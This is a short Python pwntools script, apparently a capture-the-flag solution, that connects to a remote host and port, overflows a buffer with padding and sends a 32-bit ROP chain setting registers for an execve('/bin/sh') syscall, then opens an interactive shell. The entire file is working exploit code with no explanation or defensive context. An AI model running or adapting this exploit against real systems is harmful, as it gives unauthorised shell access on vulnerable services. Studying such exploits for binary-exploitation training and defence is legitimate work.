#!/usr/bin/env python
from pwn import *

r = remote(sys.argv[1], int(sys.argv[2]))

binsh = 0x80b2313

payload = "PADDING!"*10
payload += p32(0x0805d451) + p32(0) # pop ecx; add al, 0xf6; ret;
payload += p32(0x080aeaca) + p32(0xb) # pop eax; ret;
payload += p32(0x08057fd9) + p32(0) + p32(binsh) # pop edx; pop ebx; ret;
payload += p32(0x0804ae5a) + p32(0) # pop esi; ret;
payload += p32(0x08070fd0) # int 0x80; ret;

r.sendlineafter(">", payload)
r.interactive()
